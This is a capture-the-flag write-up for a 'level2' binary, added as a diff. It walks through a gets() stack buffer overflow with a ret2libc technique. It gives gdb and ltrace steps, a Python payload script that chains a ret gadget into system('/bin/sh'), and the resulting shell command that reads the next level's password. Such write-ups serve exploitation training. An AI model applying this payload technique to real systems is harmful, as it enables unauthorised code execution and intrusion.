@@ -1,0 +1,75 @@
+First in ./level2, we can see a function named p()
+
+In this function there's a gets which could help us to do a bufferoverflow and
+overwrite EIP.
+Therefore, the EIP value just after gets is tested. 
+
+If we overwrite EIP with a stack value, (starting by 0xb) it jumps in a scope
+where there's an exit, which cancel our hope to reach a ret instruction.
+
+We would have used the system function from the libc, but this function address starts
+with 0xb
+
+Regarding the EIP test, we must use an address instruction from the program
+(which doesn't start with 0xb) and which could help us to start another function
+(maybe starting with 0xb)
+
+1 :
+Let's get the ret instruction from main (by exemple):
+gdb ./level2
+disas main
+
+Now we can get the ret address.
+
+2 :
+Let's get the system() address
+gdb ./level2
+b main
+run
+p system
+
+prints the system() address : 0xb7e6b060
+
+3 :
+Let's get the pad size needed to reach the saved EIP address.
+We must break just before the gets and check what is the address given to gets
+gdb ./level2
+disas p
+b *0x80484ed
+run
+x $esp
+
+prints 0xbffff6ac
+
+Now lets substract it with the the saved EIP address given by "info frame"
+Address of saved EIP is : 0xbffff6fc
+print/d 0xbffff6fc - 0xbffff6ac
+
+prints 80
+
+4 :
+We must get the stack address of the given param of gets, but out of the gdb
+environement.
+ltrace ./level2
+
+prints : gets(0xbffff6cc ...)
+
+5 :
+Now we can write our python script :
+
+string = "/bin/sh\x00"
+pad = "A" * (80 - 8)
+ret_address = "\x08\x04\x85\x4b"[::-1]
+system_address = "\xb7\xe6\xb0\x60"[::-1]
+saved_eip_pad = "AAAA"
+gets_param_address = "\xbf\xff\xf6\xcc"[::-1]
+
+print string + pad + ret_address + system_address + saved_eip_pad + gets_param_address
+
+6 :
+Let's execute it :
+
+(python /tmp/exploit.py; cat -) | ./level2
+cd .. && cat ./level3/.pass
+
+Prints : 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
